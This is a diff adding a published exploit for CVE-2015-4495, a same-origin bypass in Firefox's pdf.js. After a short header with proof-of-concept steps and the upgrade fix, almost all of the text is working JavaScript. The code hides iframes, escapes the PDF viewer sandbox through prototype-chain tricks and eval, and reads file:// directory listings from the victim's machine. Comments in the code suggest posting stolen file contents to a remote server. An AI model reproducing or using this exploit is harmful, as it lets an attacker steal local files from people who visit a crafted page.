@@ -1,0 +1,245 @@
+/*
+# Exploit Title: Firefox < 39.03 pdf.js same origin policy exploit
+# Date: 13-08-2014
+# Vendor Homepage: https://www.mozilla.org/en-US/firefox/new/
+# Software Link: http://ftp.mozilla.org/pub/firefox/releases/39.0/linux-x86_64/en-US/firefox-39.0.tar.bz2
+# Version: 39.0 [Should work version before 39.0.3]
+# Tested on: Linux (Ubuntu 14.04.3 LTS) [Should probably work in OSX]
+# CVE : 2015-4495
+
+# POC code taken from https://github.com/vincd/CVE-2015-4495
+
+1. Description
+  This exploit allow attacker to read and copy information on victim's computer, once they view the web site crafted with this exploit.
+  
+2. Proof of Concept
+  Create a index.html and copy and paste the following html into it:
+        <!DOCTYPE html>
+        <html>
+            <head>
+                <title>CVE-2015-4495</title>
+            </head>
+            <body>
+                <h1>Test</h1>
+                <script type="text/javascript" src="./exploit.js" charset="utf-8"></script>
+            </body>
+        </html>
+
+    Run the index.html (Make sure the main.js is in the same directory) and we should be able to see the directory listing. 
+
+3. Solution
+  Upgrade to the latest firefox ( > 39.0.3)
+
+*/
+
+var start_timeout=2000;
+var sandbox_context_i=null;
+var DIR_CACHE={};
+var FILE_CACHE={};
+var hidden=true;
+var my_win_id=null;
+
+function start() {
+    i=document.getElementById("i");
+    i2=document.getElementById("i2");
+    if(typeof sandboxContext!=='undefined') {
+        clearInterval(intVal);
+        var os = navigator.platform;
+
+        if (os.search("Mac") > -1 || os.search("Linux") > -1) {
+            // NOTE: Replace the following root directory into any directory of your
+            // choice. Can make it an array and loop through it.
+            get_dir("/", function(data) {
+                // nothing to do here...
+            });
+        }
+    }
+}
+
+function parse_directory_listing(dir, data) {
+    var pattern = '<tbody><tr><td><a class=';
+    var start = 0;
+    var listing = 'Listing:\n';
+
+    while ((start = data.search(pattern)) >= 0) {
+        var d = data.substring(start + pattern.length + 1),
+        end = d.search('>'),
+        f = d.substring(0, end);
+        f = f.split(' ');
+        var t = f[0].substring(0, f[0].length-1);
+        var n = f[1].substring(6, f[1].length-1);
+        listing += '  [' + t + '] ' + dir + '/' + n + '\n';
+        data = d.substring(end);
+    }
+
+    // NOTE: Replace with some other useful stuff. Eg: Read the file and do a post
+    // request to send all the content to a remote server.
+    alert(listing);
+}
+
+function get_dir(dir,callback,internal) {
+    get(dir,function() {
+        data=get_data(this);
+        var dir=location.href.toString();
+        dir=dir.replace(/^file\:\/\//i,'');
+        dir=decodeURIComponent(dir);
+        parse_directory_listing(dir, data);
+    }, 500, "%target_dir%", dir);
+}
+
+function xml2string(obj) {
+    return new XMLSerializer().serializeToString(obj);
+}
+
+function _(s,template,value) {
+    s=s.toString().split(/^\s*function\s+\(\s*\)\s*\{/)[1];
+    s=s.substring(0,s.length-1);
+    if(template&&value)
+        s=s.replace(template,value);
+
+    s+=parse_directory_listing;
+    s+=__proto;
+    s+=xml2string;
+    s+=get_data;
+    s=s.replace(/\s\/\/.*\n/g,"");
+    s=s+";undefined";
+
+    return s;
+}
+
+function __proto(obj) {
+    return obj.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__;
+}
+
+function get_data(obj) {
+    data=null;
+    try {
+        data=obj.document.documentElement.innerHTML;
+        if (data.indexOf('dirListing') < 0) {
+            throw new Error();
+        }
+    } catch(e) {
+        if (this.document instanceof XMLDocument) {
+            data=xml2string(this.document);
+        } else {
+            try {
+                if (this.document.body.firstChild.nodeName.toUpperCase()=='PRE') {
+                    data=this.document.body.firstChild.textContent;
+                } else {
+                    throw new Error();
+                }
+            } catch(e) {
+                try {
+                    if (this.document.body.baseURI.indexOf('pdf.js') >= 0 || data.indexOf('aboutNetError') >- 1 ) {
+                        return null;
+                    } else {
+                        throw new Error();
+                    }
+                } catch(e) {
+                    ;
+                }
+            }
+        }
+    }
+    return data;
+}
+
+function get(path,callback,timeout,template,value){
+    callback = _(callback);
+    if(template && value) callback = callback.replace(template,value);
+
+    proto_prefix="file://";
+    var invisible_code="";
+    js_call1='javascript:'+invisible_code+_(function(){
+        try {
+            open("%url%","_self");
+        } catch(e) {
+            history.back();
+        } undefined;
+    }, "%url%", proto_prefix+path);
+    js_call2='javascript:' + invisible_code + ';try{updateHidden();}catch(e){};' + callback + ';undefined';
+    sandboxContext(_(function() {
+        p = __proto(i.contentDocument.styleSheets[0].ownerNode);
+        l = p.__lookupSetter__.call(i2.contentWindow,'location');
+        l.call(i2.contentWindow, window.wrappedJSObject.js_call1);
+    }));
+    setTimeout((function() {
+        sandboxContext(_(function() {
+            p = __proto(i.contentDocument.styleSheets[0].ownerNode);
+            l = p.__lookupSetter__.call(i2.contentWindow,'location');
+            l.call(i2.contentWindow,window.wrappedJSObject.js_call2);
+        }));
+    }), timeout);
+}
+
+function get_sandbox_context() {
+    if(my_win_id==null) {
+        for(var i=0;i<20;i++) {
+            try {
+                if(window[i].location.toString().indexOf("view-source:")!=-1) {
+                    my_win_id=i;;break;
+                }
+            } catch(e) {}
+        }
+    };
+    if(my_win_id==null) return;
+    clearInterval(sandbox_context_i);
+    object.data='view-source:' + blobURL;
+    window[my_win_id].location='data:application/x-moz-playpreview-pdfjs;,';
+    object.data='data:text/html,<html/>';
+    window[my_win_id].frameElement.insertAdjacentHTML('beforebegin', '<iframe onload="' + _(function() {
+        window.wrappedJSObject.sandboxContext = (function(cmd) {
+            with(importFunction.constructor('return this')()) {
+                return eval(cmd);
+            }
+        });
+    }) + '"/>');
+}
+
+function setup_plugin() {
+    var i = document.createElement("iframe");
+    i.id = "i";
+    i.width = 1;
+    i.height = 1;
+    i.src = "data:application/xml,<" + "?xml version=\"1.0\"?><e><e1></e1></e>";
+    i.frameBorder = 0;
+    document.documentElement.appendChild(i);
+    i.onload=function() {
+        if(this.contentDocument.styleSheets.length>0) {
+            var i2 = document.createElement("iframe");
+            i2.id="i2";
+            i2.src="data:application/pdf,";
+            i2.frameBorder=0;
+            if(!hidden) {
+                i2.width="100%";
+                i2.height="700px";
+            } else {
+                i2.width=1;
+                i2.height=1;
+            }
+            document.documentElement.appendChild(i2);
+            pdfBlob=new Blob([''], { type:'application/pdf' });
+            blobURL = URL.createObjectURL(pdfBlob);
+            object = document.createElement('object');
+            object.data='data:application/pdf,';
+            if(hidden) {
+                object.style.display='none';
+                object.width=1;
+                object.height=1;
+            }
+            object.onload = (function() {
+                sandbox_context_i = setInterval(get_sandbox_context,200);
+                object.onload=null;
+                object.data='view-source:' + location.href;return;
+            });
+            document.documentElement.appendChild(object);
+        } else {
+            this.contentWindow.location.reload();
+        }
+    }
+}
+
+setTimeout(function() {
+    setup_plugin();
+    intVal = setInterval(start, 150);
+}, start_timeout);
